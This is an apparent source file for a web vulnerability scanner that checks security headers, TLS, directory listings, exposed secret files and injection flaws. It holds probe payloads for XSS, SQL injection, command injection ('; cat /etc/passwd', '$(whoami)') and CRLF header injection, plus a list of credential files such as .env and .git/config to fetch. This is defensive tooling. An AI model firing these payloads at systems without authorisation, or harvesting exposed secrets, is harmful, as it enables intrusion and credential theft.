import { FindingType, Severity } from '@prisma/client'

export type ScanType = 'QUICK' | 'STANDARD' | 'DEEP' | 'CUSTOM'

export interface ScanOptions {
  scanType?: ScanType
  customChecks?: string[] // For CUSTOM scan type
  onProgress?: (progress: number, currentCheck: string) => void
}

export interface ScanResult {
  findings: Finding[]
  riskScore: number
  riskLevel: 'LOW' | 'MEDIUM' | 'HIGH'
  duration: number // Duration in seconds
}

export interface Finding {
  type: FindingType
  title: string
  severity: Severity
  passed: boolean
  details?: string
}

async function checkHeaders(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'User-Agent': 'VulnerabilityScanner/1.0',
      },
      redirect: 'follow',
    })

    const headers = response.headers
    
    // Content-Security-Policy - Check presence and quality
    const csp = headers.get('content-security-policy')
    if (!csp) {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Missing: Content-Security-Policy',
        severity: 'HIGH' as Severity,
        passed: false,
        details: 'Content-Security-Policy header is missing. This is critical for preventing XSS attacks.',
      })
    } else {
      const cspLower = csp.toLowerCase()
      if (cspLower.includes('unsafe-inline') || cspLower.includes("*")) {
        findings.push({
          type: 'HEADER' as FindingType,
          title: 'Weak Content-Security-Policy',
          severity: 'HIGH' as Severity,
          passed: false,
          details: `CSP contains unsafe directives: ${csp}. This weakens XSS protection.`,
        })
      } else {
        findings.push({
          type: 'HEADER' as FindingType,
          title: 'Present: Content-Security-Policy',
          severity: 'INFO' as Severity,
          passed: true,
          details: `CSP is present and appears secure: ${csp}`,
        })
      }
    }

    // X-Frame-Options - Require DENY or SAMEORIGIN
    const xFrameOptions = headers.get('x-frame-options')
    if (!xFrameOptions) {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Missing: X-Frame-Options',
        severity: 'MEDIUM' as Severity,
        passed: false,
        details: 'X-Frame-Options header is missing. This allows clickjacking attacks.',
      })
    } else {
      const xfoUpper = xFrameOptions.toUpperCase()
      if (xfoUpper === 'DENY' || xfoUpper === 'SAMEORIGIN') {
        findings.push({
          type: 'HEADER' as FindingType,
          title: 'Present: X-Frame-Options',
          severity: 'INFO' as Severity,
          passed: true,
          details: `X-Frame-Options is properly configured: ${xFrameOptions}`,
        })
      } else {
        findings.push({
          type: 'HEADER' as FindingType,
          title: 'Weak X-Frame-Options',
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `X-Frame-Options value "${xFrameOptions}" is not recommended. Should be DENY or SAMEORIGIN.`,
        })
      }
    }

    // X-Content-Type-Options
    const xContentType = headers.get('x-content-type-options')
    if (!xContentType) {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Missing: X-Content-Type-Options',
        severity: 'MEDIUM' as Severity,
        passed: false,
        details: 'X-Content-Type-Options header is missing. This helps prevent MIME type sniffing attacks.',
      })
    } else if (xContentType.toUpperCase() === 'NOSNIFF') {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Present: X-Content-Type-Options',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'X-Content-Type-Options is properly configured.',
      })
    }

    // Strict-Transport-Security - Require max-age
    const hsts = headers.get('strict-transport-security')
    if (!hsts) {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Missing: Strict-Transport-Security',
        severity: 'HIGH' as Severity,
        passed: false,
        details: 'Strict-Transport-Security header is missing. This is critical for HTTPS-only sites.',
      })
    } else {
      const hstsLower = hsts.toLowerCase()
      if (hstsLower.includes('max-age=')) {
        const maxAgeMatch = hstsLower.match(/max-age=(\d+)/)
        if (maxAgeMatch) {
          const maxAge = parseInt(maxAgeMatch[1])
          if (maxAge >= 31536000) { // 1 year
            findings.push({
              type: 'HEADER' as FindingType,
              title: 'Present: Strict-Transport-Security',
              severity: 'INFO' as Severity,
              passed: true,
              details: `HSTS is properly configured with max-age=${maxAge}`,
            })
          } else {
            findings.push({
              type: 'HEADER' as FindingType,
              title: 'Weak Strict-Transport-Security',
              severity: 'MEDIUM' as Severity,
              passed: false,
              details: `HSTS max-age is too short (${maxAge}). Should be at least 31536000 (1 year).`,
            })
          }
        }
      } else {
        findings.push({
          type: 'HEADER' as FindingType,
          title: 'Invalid Strict-Transport-Security',
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `HSTS header is missing max-age directive: ${hsts}`,
        })
      }
    }

    // Referrer-Policy
    const referrerPolicy = headers.get('referrer-policy')
    if (!referrerPolicy) {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Missing: Referrer-Policy',
        severity: 'LOW' as Severity,
        passed: false,
        details: 'Referrer-Policy header is missing. This helps control referrer information leakage.',
      })
    } else {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Present: Referrer-Policy',
        severity: 'INFO' as Severity,
        passed: true,
        details: `Referrer-Policy is configured: ${referrerPolicy}`,
      })
    }

    // Permissions-Policy (formerly Feature-Policy)
    const permissionsPolicy = headers.get('permissions-policy') || headers.get('feature-policy')
    if (!permissionsPolicy) {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Missing: Permissions-Policy',
        severity: 'MEDIUM' as Severity,
        passed: false,
        details: 'Permissions-Policy header is missing. This header restricts which browser features can be used, helping prevent abuse of APIs like camera, microphone, geolocation, etc.',
      })
    } else {
      findings.push({
        type: 'HEADER' as FindingType,
        title: 'Present: Permissions-Policy',
        severity: 'INFO' as Severity,
        passed: true,
        details: `Permissions-Policy is configured: ${permissionsPolicy}`,
      })
    }
  } catch (error) {
    findings.push({
      type: 'HEADER' as FindingType,
      title: 'Failed to check headers',
      severity: 'MEDIUM' as Severity,
      passed: false,
      details: error instanceof Error ? error.message : 'Unknown error',
    })
  }

  return findings
}

async function checkSSL(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const isHttps = urlObj.protocol === 'https:'
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`
    
    if (!isHttps) {
      findings.push({
        type: 'SSL' as FindingType,
        title: 'Not using HTTPS',
        severity: 'HIGH' as Severity,
        passed: false,
        details: 'The URL is using HTTP instead of HTTPS, which means data is transmitted in plain text',
      })

      // Check for HTTPS redirect
      try {
        const httpsUrl = baseUrl.replace('http://', 'https://')
        const redirectResponse = await fetch(httpsUrl, {
          method: 'HEAD',
          redirect: 'follow',
        })
        
        if (redirectResponse.ok) {
          findings.push({
            type: 'SSL' as FindingType,
            title: 'HTTPS redirect available',
            severity: 'INFO' as Severity,
            passed: true,
            details: 'HTTPS version is accessible. Consider redirecting HTTP to HTTPS automatically.',
          })
        }
      } catch (error) {
        findings.push({
          type: 'SSL' as FindingType,
          title: 'No HTTPS redirect',
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: 'HTTP site does not redirect to HTTPS. Users may access the site over insecure HTTP.',
        })
      }

      return findings
    }

    try {
      const response = await fetch(url, {
        method: 'HEAD',
        redirect: 'follow',
      })
      
      findings.push({
        type: 'SSL' as FindingType,
        title: 'HTTPS connection successful',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'HTTPS is enabled and connection is successful',
      })

      // Check for weak TLS versions (basic check via user agent or connection)
      // Note: Full TLS version detection requires Node.js tls module
      // This is a simplified check
      const serverHeader = response.headers.get('server')
      if (serverHeader) {
        // Some servers expose TLS info in headers (rare but possible)
        const serverLower = serverHeader.toLowerCase()
        if (serverLower.includes('tls/1.0') || serverLower.includes('tls/1.1')) {
          findings.push({
            type: 'SSL' as FindingType,
            title: 'Weak TLS versions detected',
            severity: 'HIGH' as Severity,
            passed: false,
            details: `Server appears to support weak TLS versions (1.0 or 1.1). These versions are deprecated and vulnerable. Server header: ${serverHeader}`,
          })
        }

        // Check for weak ciphers (basic check based on server headers)
        // Some old server configurations might indicate weak ciphers
        if (serverLower.includes('ssl') && (serverLower.includes('2.0') || serverLower.includes('3.0'))) {
          findings.push({
            type: 'SSL' as FindingType,
            title: 'Possible weak ciphers',
            severity: 'MEDIUM' as Severity,
            passed: false,
            details: `Server configuration may support weak ciphers. Server header: ${serverHeader}. For detailed cipher analysis, use specialized TLS tools.`,
          })
        }
      }

      // Note: Full TLS version and cipher checking requires Node.js tls.connect
      // For now, we'll add a note that this requires deeper inspection
      findings.push({
        type: 'SSL' as FindingType,
        title: 'TLS version check (basic)',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'Basic HTTPS check passed. For detailed TLS version and cipher analysis, use specialized tools.',
      })
    } catch (error) {
      findings.push({
        type: 'SSL' as FindingType,
        title: 'SSL/TLS connection issue',
        severity: 'HIGH' as Severity,
        passed: false,
        details: error instanceof Error ? error.message : 'Failed to establish secure connection',
      })
    }
  } catch (error) {
    findings.push({
      type: 'SSL' as FindingType,
      title: 'Invalid URL format',
      severity: 'MEDIUM' as Severity,
      passed: false,
      details: error instanceof Error ? error.message : 'Could not parse URL',
    })
  }

  return findings
}

async function checkXSSSurface(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: {
        'User-Agent': 'VulnerabilityScanner/1.0',
      },
      redirect: 'follow',
    })

    const html = await response.text()
    
    // Check for inline script tags
    const inlineScriptRegex = /<script[^>]*>[\s\S]*?<\/script>/gi
    const inlineScripts = html.match(inlineScriptRegex)
    
    if (inlineScripts && inlineScripts.length > 0) {
      findings.push({
        type: 'XSS' as FindingType,
        title: 'Inline script tags detected',
        severity: 'HIGH' as Severity,
        passed: false,
        details: `Found ${inlineScripts.length} inline <script> tag(s). Inline scripts are vulnerable to XSS attacks. Consider moving scripts to external files.`,
      })
    } else {
      findings.push({
        type: 'XSS' as FindingType,
        title: 'No inline script tags detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No inline <script> tags found in the HTML response.',
      })
    }

    // Check for on* event attributes
    const onEventRegex = /\s(on\w+)\s*=\s*["'][^"']*["']/gi
    const onEvents = html.match(onEventRegex)
    
    if (onEvents && onEvents.length > 0) {
      const uniqueEvents = [...new Set(onEvents.map(e => e.match(/\s(on\w+)\s*=/)?.[1]).filter(Boolean))]
      findings.push({
        type: 'XSS' as FindingType,
        title: 'Inline event handlers detected',
        severity: 'HIGH' as Severity,
        passed: false,
        details: `Found ${onEvents.length} inline event handler(s) (${uniqueEvents.join(', ')}). Inline event handlers are vulnerable to XSS. Use addEventListener instead.`,
      })
    } else {
      findings.push({
        type: 'XSS' as FindingType,
        title: 'No inline event handlers detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No inline event handlers (onclick, onload, etc.) found in the HTML response.',
      })
    }
  } catch (error) {
    findings.push({
      type: 'XSS' as FindingType,
      title: 'Failed to check XSS surface',
      severity: 'MEDIUM' as Severity,
      passed: false,
      details: error instanceof Error ? error.message : 'Could not analyze HTML for XSS vulnerabilities',
    })
  }

  return findings
}

async function checkPorts(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const hostname = urlObj.hostname
    
    // For MVP, we'll simulate port checks
    // In production, you'd use nmap or tcp.connect
    const SUSPICIOUS_PORTS = [
      { port: 21, name: 'FTP' },
      { port: 22, name: 'SSH' },
      { port: 3306, name: 'MySQL' },
      { port: 5432, name: 'PostgreSQL' },
      { port: 3389, name: 'RDP' },
      { port: 1433, name: 'MSSQL' },
    ]
    
    const openPorts: number[] = []
    
    // Mock check - in production, use actual port scanning
    for (const portInfo of SUSPICIOUS_PORTS) {
      const isOpen = false // Mock: assume closed for MVP
      
      if (isOpen) {
        openPorts.push(portInfo.port)
        findings.push({
          type: 'PORT' as FindingType,
          title: `Suspicious port open: ${portInfo.port} (${portInfo.name})`,
          severity: 'HIGH' as Severity,
          passed: false,
          details: `Port ${portInfo.port} (${portInfo.name}) is open on ${hostname}. This may expose sensitive services.`,
        })
      }
    }
    
    if (openPorts.length === 0) {
      findings.push({
        type: 'PORT' as FindingType,
        title: 'No suspicious ports detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No commonly exploited ports were found to be open',
      })
    }
  } catch (error) {
    findings.push({
      type: 'PORT' as FindingType,
      title: 'Port scan failed',
      severity: 'MEDIUM' as Severity,
      passed: false,
      details: error instanceof Error ? error.message : 'Could not perform port scan',
    })
  }

  return findings
}

async function checkDirectoryListing(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  const commonPaths = ['/', '/uploads/', '/images/', '/backup/', '/files/', '/public/']
  
  for (const path of commonPaths) {
    try {
      const testUrl = new URL(path, url).toString()
      const response = await fetch(testUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
        redirect: 'follow',
      })
      
      const html = await response.text()
      const lowerHtml = html.toLowerCase()
      
      if (lowerHtml.includes('index of') || 
          lowerHtml.includes('directory listing') ||
          lowerHtml.includes('<title>index of') ||
          (lowerHtml.includes('<pre>') && lowerHtml.includes('parent directory'))) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: `Directory listing enabled on ${path}`,
          severity: 'MEDIUM' as Severity,
          passed: false,
          details: `Directory listing appears to be enabled on ${path}. This can expose sensitive files and directory structure.`,
        })
      }
    } catch (error) {
      // Ignore errors for individual paths
    }
  }
  
  if (findings.length === 0) {
    findings.push({
      type: 'OTHER' as FindingType,
      title: 'No directory listing detected',
      severity: 'INFO' as Severity,
      passed: true,
      details: 'No directory listing was detected on common paths.',
    })
  }
  
  return findings
}

async function checkHTTPMethods(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  const unsafeMethods = ['PUT', 'DELETE', 'TRACE', 'PATCH']
  
  for (const method of unsafeMethods) {
    try {
      const response = await fetch(url, {
        method: method as any,
        headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
        redirect: 'follow',
      })
      
      // If method is allowed (not 405 Method Not Allowed)
      if (response.status !== 405 && response.status < 500) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: `Potentially unsafe HTTP method enabled: ${method}`,
          severity: response.status < 400 ? 'HIGH' : 'MEDIUM' as Severity,
          passed: false,
          details: `HTTP ${method} method is enabled and returned status ${response.status}. This method should be disabled if not needed.`,
        })
      }
    } catch (error) {
      // Ignore errors
    }
  }
  
  if (findings.length === 0) {
    findings.push({
      type: 'OTHER' as FindingType,
      title: 'Unsafe HTTP methods appear disabled',
      severity: 'INFO' as Severity,
      passed: true,
      details: 'PUT, DELETE, TRACE, and PATCH methods appear to be disabled or not allowed.',
    })
  }
  
  return findings
}

async function checkMixedContent(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    if (urlObj.protocol !== 'https:') {
      return findings // Only check for mixed content on HTTPS pages
    }
    
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
      redirect: 'follow',
    })
    
    const html = await response.text()
    
    // Check for HTTP resources in HTTPS page
    const httpResourceRegex = /(src|href|action)=["'](http:\/\/[^"']+)["']/gi
    const matches = html.match(httpResourceRegex)
    
    if (matches && matches.length > 0) {
      const uniqueResources = [...new Set(matches.map(m => m.match(/http:\/\/[^"']+/)?.[0]).filter(Boolean))]
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'Mixed content detected (insecure HTTP resources on HTTPS page)',
        severity: 'MEDIUM' as Severity,
        passed: false,
        details: `Found ${uniqueResources.length} HTTP resource(s) loaded on HTTPS page: ${uniqueResources.slice(0, 3).join(', ')}${uniqueResources.length > 3 ? '...' : ''}. This can be exploited by attackers.`,
      })
    } else {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No mixed content detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No HTTP resources found on HTTPS page.',
      })
    }
  } catch (error) {
    // Ignore errors
  }
  
  return findings
}

async function checkSecurityTxt(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`
    
    // Check for security.txt
    try {
      const securityTxtUrl = `${baseUrl}/.well-known/security.txt`
      const response = await fetch(securityTxtUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
        redirect: 'follow',
      })
      
      if (response.ok) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'security.txt found',
          severity: 'INFO' as Severity,
          passed: true,
          details: 'security.txt file is present at /.well-known/security.txt',
        })
      } else {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'security.txt not found',
          severity: 'INFO' as Severity,
          passed: false,
          details: 'security.txt file is missing. Consider adding one at /.well-known/security.txt for security researchers.',
        })
      }
    } catch (error) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'security.txt not found',
        severity: 'INFO' as Severity,
        passed: false,
        details: 'security.txt file is missing. Consider adding one at /.well-known/security.txt for security researchers.',
      })
    }
    
    // Check for robots.txt (informational)
    try {
      const robotsTxtUrl = `${baseUrl}/robots.txt`
      const response = await fetch(robotsTxtUrl, {
        method: 'GET',
        headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
        redirect: 'follow',
      })
      
      if (response.ok) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: 'robots.txt found',
          severity: 'INFO' as Severity,
          passed: true,
          details: 'robots.txt file is present',
        })
      }
    } catch (error) {
      // Ignore robots.txt errors
    }
  } catch (error) {
    // Ignore errors
  }
  
  return findings
}

async function checkSQLiXSSProbe(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const params = urlObj.searchParams
    
    if (params.toString().length === 0) {
      // No query parameters, skip probing
      return findings
    }
    
    // XSS payloads
    const xssPayloads = [
      '<script>alert(1)</script>',
      '\'"><img src=x onerror=alert(1)>',
      'javascript:alert(1)',
    ]
    
    // SQLi payloads
    const sqliPayloads = [
      "1' OR '1'='1",
      "1'--",
      "' UNION SELECT NULL--",
    ]
    
    // Test XSS
    for (const [key, value] of params.entries()) {
      for (const payload of xssPayloads) {
        try {
          const testUrl = new URL(url)
          testUrl.searchParams.set(key, payload)
          
          const response = await fetch(testUrl.toString(), {
            method: 'GET',
            headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
            redirect: 'follow',
          })
          
          const html = await response.text()
          
          // Check if payload is reflected unescaped
          if (html.includes(payload) || html.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) {
            findings.push({
              type: 'XSS' as FindingType,
              title: `Possible reflected XSS surface on parameter: ${key}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `The parameter "${key}" appears to reflect user input without proper encoding. This may indicate a reflected XSS vulnerability.`,
            })
            break // Only report once per parameter
          }
        } catch (error) {
          // Ignore errors
        }
      }
    }
    
    // Test SQLi
    for (const [key, value] of params.entries()) {
      for (const payload of sqliPayloads) {
        try {
          const testUrl = new URL(url)
          testUrl.searchParams.set(key, payload)
          
          const response = await fetch(testUrl.toString(), {
            method: 'GET',
            headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
            redirect: 'follow',
          })
          
          const html = await response.text().toLowerCase()
          
          // Check for SQL error patterns
          const sqlErrorPatterns = [
            'sql syntax',
            'mysql error',
            'postgresql error',
            'ora-',
            'sqlite error',
            'warning: mysql',
            'unclosed quotation mark',
            'quoted string not properly terminated',
          ]
          
          for (const pattern of sqlErrorPatterns) {
            if (html.includes(pattern)) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `Potential SQL error exposure detected on parameter: ${key}`,
                severity: 'HIGH' as Severity,
                passed: false,
                details: `SQL error message detected in response for parameter "${key}". This may indicate a SQL injection vulnerability.`,
              })
              break
            }
          }
        } catch (error) {
          // Ignore errors
        }
      }
    }
  } catch (error) {
    // Ignore errors
  }
  
  return findings
}

async function checkInjectionVulnerabilities(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const params = urlObj.searchParams
    
    if (params.toString().length === 0) {
      // No query parameters, skip injection tests
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No injection vulnerabilities detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No query parameters found to test for injection vulnerabilities.',
      })
      return findings
    }

    // Command Injection payloads
    const commandInjectionPayloads = [
      '; ls',
      '| whoami',
      '&& id',
      '`whoami`',
      '$(whoami)',
      '; cat /etc/passwd',
    ]

    // HTML Injection payloads
    const htmlInjectionPayloads = [
      '<h1>test</h1>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      '<iframe src=javascript:alert(1)>',
    ]

    // Header Injection payloads
    const headerInjectionPayloads = [
      'test%0d%0aX-Injected: header',
      'test%0aX-Injected: header',
      'test%0dX-Injected: header',
    ]

    let commandInjectionFound = false
    let htmlInjectionFound = false
    let headerInjectionFound = false

    // Test Command Injection
    for (const [key, value] of params.entries()) {
      if (commandInjectionFound) break
      
      for (const payload of commandInjectionPayloads) {
        try {
          const testUrl = new URL(url)
          testUrl.searchParams.set(key, payload)
          
          const response = await fetch(testUrl.toString(), {
            method: 'GET',
            headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
            redirect: 'follow',
          })
          
          const html = await response.text().toLowerCase()
          
          // Check for command execution indicators
          const commandIndicators = [
            'uid=',
            'gid=',
            'root:',
            '/bin/sh',
            '/etc/passwd',
            'command not found',
            'permission denied',
          ]
          
          for (const indicator of commandIndicators) {
            if (html.includes(indicator)) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `Possible command injection on parameter: ${key}`,
                severity: 'HIGH' as Severity,
                passed: false,
                details: `Command injection vulnerability may exist. Response contains command execution indicators for parameter "${key}".`,
              })
              commandInjectionFound = true
              break
            }
          }
        } catch (error) {
          // Ignore errors
        }
      }
    }

    // Test HTML Injection
    for (const [key, value] of params.entries()) {
      if (htmlInjectionFound) break
      
      for (const payload of htmlInjectionPayloads) {
        try {
          const testUrl = new URL(url)
          testUrl.searchParams.set(key, payload)
          
          const response = await fetch(testUrl.toString(), {
            method: 'GET',
            headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
            redirect: 'follow',
          })
          
          const html = await response.text()
          
          // Check if HTML payload is reflected unescaped
          if (html.includes(payload) && !html.includes(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;'))) {
            findings.push({
              type: 'XSS' as FindingType,
              title: `HTML injection detected on parameter: ${key}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `HTML injection vulnerability detected. User input in parameter "${key}" is reflected in the response without proper encoding, allowing HTML/script injection.`,
            })
            htmlInjectionFound = true
            break
          }
        } catch (error) {
          // Ignore errors
        }
      }
    }

    // Test Header Injection
    for (const [key, value] of params.entries()) {
      if (headerInjectionFound) break
      
      for (const payload of headerInjectionPayloads) {
        try {
          const testUrl = new URL(url)
          testUrl.searchParams.set(key, payload)
          
          const response = await fetch(testUrl.toString(), {
            method: 'GET',
            headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
            redirect: 'follow',
          })
          
          // Check if custom header appears in response headers
          const customHeader = response.headers.get('x-injected')
          if (customHeader) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `Header injection detected on parameter: ${key}`,
              severity: 'HIGH' as Severity,
              passed: false,
              details: `Header injection vulnerability detected. Parameter "${key}" allows injection of HTTP headers, which can lead to cache poisoning, XSS, and other attacks.`,
            })
            headerInjectionFound = true
            break
          }

          // Check response body for header-like patterns
          const html = await response.text()
          if (html.includes('X-Injected:') || html.includes('x-injected:')) {
            findings.push({
              type: 'OTHER' as FindingType,
              title: `Possible header injection on parameter: ${key}`,
              severity: 'MEDIUM' as Severity,
              passed: false,
              details: `Header injection may be possible. Parameter "${key}" appears to reflect header-like content in the response.`,
            })
            headerInjectionFound = true
            break
          }
        } catch (error) {
          // Ignore errors
        }
      }
    }

    if (findings.length === 0) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: 'No injection vulnerabilities detected',
        severity: 'INFO' as Severity,
        passed: true,
        details: 'No command injection, HTML injection, or header injection vulnerabilities were detected in query parameters.',
      })
    }
  } catch (error) {
    // Ignore errors
  }

  return findings
}

async function checkTechFingerprinting(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const response = await fetch(url, {
      method: 'GET',
      headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
      redirect: 'follow',
    })
    
    const headers = response.headers
    
    // Check Server header
    const server = headers.get('server')
    if (server) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: `Server header exposed: ${server}`,
        severity: 'INFO' as Severity,
        passed: false,
        details: `Server header reveals technology stack: ${server}. Consider hiding this information.`,
      })
    }
    
    // Check X-Powered-By header
    const poweredBy = headers.get('x-powered-by')
    if (poweredBy) {
      findings.push({
        type: 'OTHER' as FindingType,
        title: `X-Powered-By header exposed: ${poweredBy}`,
        severity: 'INFO' as Severity,
        passed: false,
        details: `X-Powered-By header reveals technology: ${poweredBy}. Consider removing this header.`,
      })
    }
    
    // Check for other technology indicators
    const techIndicators = [
      { header: 'x-aspnet-version', name: 'ASP.NET' },
      { header: 'x-aspnetmvc-version', name: 'ASP.NET MVC' },
      { header: 'x-runtime', name: 'Runtime version' },
    ]
    
    for (const indicator of techIndicators) {
      const value = headers.get(indicator.header)
      if (value) {
        findings.push({
          type: 'OTHER' as FindingType,
          title: `${indicator.name} exposed: ${value}`,
          severity: 'INFO' as Severity,
          passed: false,
          details: `Technology information exposed via ${indicator.header} header.`,
        })
      }
    }
  } catch (error) {
    // Ignore errors
  }
  
  return findings
}

async function checkSensitiveFiles(url: string): Promise<Finding[]> {
  const findings: Finding[] = []
  
  try {
    const urlObj = new URL(url)
    const baseUrl = `${urlObj.protocol}//${urlObj.host}`
    
    // List of sensitive files to check
    const sensitiveFiles = [
      { path: '/.env', name: '.env file', severity: 'HIGH' as Severity },
      { path: '/.env.local', name: '.env.local file', severity: 'HIGH' as Severity },
      { path: '/.env.production', name: '.env.production file', severity: 'HIGH' as Severity },
      { path: '/.env.development', name: '.env.development file', severity: 'HIGH' as Severity },
      { path: '/.git/config', name: '.git directory', severity: 'HIGH' as Severity },
      { path: '/.git/HEAD', name: '.git directory', severity: 'HIGH' as Severity },
      { path: '/.git/index', name: '.git directory', severity: 'HIGH' as Severity },
      { path: '/.gitignore', name: '.gitignore file', severity: 'MEDIUM' as Severity },
      { path: '/backup.zip', name: 'Backup file (.zip)', severity: 'MEDIUM' as Severity },
      { path: '/backup.tar.gz', name: 'Backup file (.tar.gz)', severity: 'MEDIUM' as Severity },
      { path: '/backup.sql', name: 'Backup file (.sql)', severity: 'HIGH' as Severity },
      { path: '/backup.sql.gz', name: 'Backup file (.sql.gz)', severity: 'HIGH' as Severity },
      { path: '/database.sql', name: 'Backup file (.sql)', severity: 'HIGH' as Severity },
      { path: '/db.sql', name: 'Backup file (.sql)', severity: 'HIGH' as Severity },
      { path: '/config.php.bak', name: 'Backup file (.bak)', severity: 'MEDIUM' as Severity },
      { path: '/config.php~', name: 'Backup file (~)', severity: 'MEDIUM' as Severity },
      { path: '/phpinfo.php', name: 'phpinfo file', severity: 'HIGH' as Severity },
      { path: '/info.php', name: 'phpinfo file', severity: 'HIGH' as Severity },
      { path: '/test.php', name: 'Test file', severity: 'MEDIUM' as Severity },
      { path: '/config.json', name: 'Config file', severity: 'MEDIUM' as Severity },
      { path: '/config.yml', name: 'Config file', severity: 'MEDIUM' as Severity },
      { path: '/config.yaml', name: 'Config file', severity: 'MEDIUM' as Severity },
      { path: '/.htaccess', name: 'Config file (.htaccess)', severity: 'LOW' as Severity },
      { path: '/web.config', name: 'Config file (web.config)', severity: 'LOW' as Severity },
      { path: '/package.json', name: 'Config file (package.json)', severity: 'LOW' as Severity },
      { path: '/composer.json', name: 'Config file (composer.json)', severity: 'LOW' as Severity },
      { path: '/.DS_Store', name: 'System file (.DS_Store)', severity: 'LOW' as Severity },
      { path: '/.idea/', name: 'IDE directory', severity: 'LOW' as Severity },
      { path: '/.vscode/', name: 'IDE directory', severity: 'LOW' as Severity },
    ]

    // Check each sensitive file
    for (const file of sensitiveFiles) {
      try {
        const testUrl = `${baseUrl}${file.path}`
        const response = await fetch(testUrl, {
          method: 'HEAD',
          headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
          redirect: 'follow',
        })

        // Check if file is accessible (status 200)
        if (response.ok) {
          // For .git files, check if it's actually git content
          if (file.path.includes('.git')) {
            const contentResponse = await fetch(testUrl, {
              method: 'GET',
              headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
              redirect: 'follow',
            })
            const content = await contentResponse.text()
            if (content.includes('ref:') || content.includes('[core]') || content.includes('refs/heads')) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `${file.name} exposed: ${file.path}`,
                severity: file.severity,
                passed: false,
                details: `Sensitive ${file.name} is publicly accessible at ${file.path}. This can expose sensitive information, credentials, or source code.`,
              })
            }
          } else if (file.path.includes('phpinfo') || file.path.includes('info.php')) {
            // Check if it's actually phpinfo output
            const contentResponse = await fetch(testUrl, {
              method: 'GET',
              headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
              redirect: 'follow',
            })
            const content = await contentResponse.text().toLowerCase()
            if (content.includes('phpinfo') || content.includes('php version') || content.includes('system information')) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `${file.name} exposed: ${file.path}`,
                severity: file.severity,
                passed: false,
                details: `phpinfo file is publicly accessible at ${file.path}. This exposes detailed PHP configuration and system information.`,
              })
            }
          } else if (file.path.includes('.env')) {
            // Check if it's actually an env file
            const contentResponse = await fetch(testUrl, {
              method: 'GET',
              headers: { 'User-Agent': 'VulnerabilityScanner/1.0' },
              redirect: 'follow',
            })
            const content = await contentResponse.text()
            if (content.includes('=') && (content.includes('API') || content.includes('SECRET') || content.includes('KEY') || content.includes('PASSWORD'))) {
              findings.push({
                type: 'OTHER' as FindingType,
                title: `${file.name} exposed: ${file.path}`,
                severity: file.severity,
                passed: false,
